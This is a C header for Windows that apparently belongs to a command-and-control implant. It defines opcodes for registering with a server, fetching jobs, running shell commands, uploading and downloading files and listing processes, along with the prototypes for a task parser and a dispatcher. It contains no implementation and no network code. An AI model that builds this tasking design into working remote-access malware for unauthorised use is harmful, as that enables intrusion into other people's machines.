#ifndef COMMAND_H
#define COMMAND_H

#include <windows.h>

#define COMMAND_REGISTER    0x187
#define COMMAND_GET_JOB     0x143
#define COMMAND_NO_JOB      0x144
#define COMMAND_OUTPUT      0x188
#define COMMAND_SHELL       0x152
#define COMMAND_UPLOAD      0x153
#define COMMAND_DOWNLOAD    0x154
#define COMMAND_EXIT        0x155
#define COMMAND_PROCLIST    0x156

#define ENDIAN_BIG      0
#define ENDIAN_LITTLE   1

typedef struct _TASK_PARSER {
    PUCHAR  Buffer;
    UINT32  Length;
    UINT32  Endian;
} TASK_PARSER, *PTASK_PARSER;

typedef VOID (*FnCommandHandler)(PTASK_PARSER);

typedef struct _COMMAND_ENTRY {
    UINT32              ID;
    FnCommandHandler    Function;
} COMMAND_ENTRY, *PCOMMAND_ENTRY;

VOID    TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian);
UINT32  TaskParserGetInt32(PTASK_PARSER Parser);
PCHAR   TaskParserGetBytes(PTASK_PARSER Parser, PUINT32 OutSize);

UINT32  DetectEndianness(PVOID Buffer, UINT32 Size);

VOID    CommandDispatcher(VOID);

VOID    CommandShell(PTASK_PARSER Parser);
VOID    CommandUpload(PTASK_PARSER Parser);
VOID    CommandDownload(PTASK_PARSER Parser);
VOID    CommandExit(PTASK_PARSER Parser);
VOID    CommandProcList(PTASK_PARSER Parser);

#endif
